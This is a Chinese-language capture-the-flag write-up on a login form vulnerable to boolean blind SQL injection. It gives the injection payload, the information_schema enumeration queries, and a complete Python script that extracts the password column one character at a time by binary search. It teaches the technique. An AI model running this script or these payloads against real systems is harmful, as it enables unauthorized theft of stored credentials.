# week3close_eyes

## 题目简述

登录接口把用户输入直接拼接到 SQL：

```php
$sql = "select username from user where username='" . $username .
       "' and password='" . $password . "';";
```

查询有记录时返回“数据库有你这号人”，无记录时返回“数据库里没你这号人”。页面不显示查询数据，但两个稳定回显构成了布尔盲注 oracle。

## 解题过程

在 MySQL 默认 SQL 模式下，`||` 表示逻辑 OR，`#` 注释该行剩余内容。用户名可构造成：

```text
1'||(条件)#
```

当“条件”为真，查询能命中现有记录并出现真值回显；为假则出现另一种回显。可以依次确认数据库结构：

```sql
database()
(SELECT GROUP_CONCAT(table_name)
 FROM information_schema.tables
 WHERE table_schema=database())
(SELECT GROUP_CONCAT(column_name)
 FROM information_schema.columns
 WHERE table_schema=database() AND table_name='user')
(SELECT GROUP_CONCAT(password) FROM user)
```

枚举结果表明当前数据库名为 `user`，目标表也是 `user`，列为 `id,username,password`，flag 位于 `password` 列。以下脚本先用 `length(...) >= pos` 判断是否还有字符，再对可打印 ASCII 的 32～126 区间进行二分；这样不会在字符串结束后继续追加伪字符。

```python
import argparse

import requests

TRUE_MARKER = "数据库有你这号人"

parser = argparse.ArgumentParser()
parser.add_argument("url", help="登录接口完整地址，例如 http://127.0.0.1/login.php")
args = parser.parse_args()

session = requests.Session()


def is_true(condition: str) -> bool:
    payload = f"1'||({condition})#"
    response = session.post(
        args.url,
        data={"username": payload, "password": "1"},
        timeout=10,
    )
    response.raise_for_status()
    return TRUE_MARKER in response.text


def extract(expression: str, max_length: int = 256) -> str:
    output = []

    for position in range(1, max_length + 1):
        if not is_true(f"length({expression}) >= {position}"):
            break

        low, high = 32, 126
        while low < high:
            middle = (low + high) // 2
            condition = (
                f"ascii(substr({expression},{position},1)) > {middle}"
            )
            if is_true(condition):
                low = middle + 1
            else:
                high = middle

        output.append(chr(low))
        print("".join(output), flush=True)
    else:
        raise RuntimeError("达到 max_length，结果可能尚未提取完整")

    return "".join(output)


expression = "(SELECT GROUP_CONCAT(password) FROM user)"
flag = extract(expression)
print(f"flag = {flag}")
```

最终得到：

```text
0xGame{blind_sqli_1s_not_hard}
```

## 方法总结

布尔盲注不需要数据库直接回显数据，只需要一个能稳定区分真假的响应特征。自动化时应先判断字符串是否结束，再逐字符二分；同时把数据库名、表名和列名的探测过程写清楚，不能只给最终查询式和硬编码旧地址。
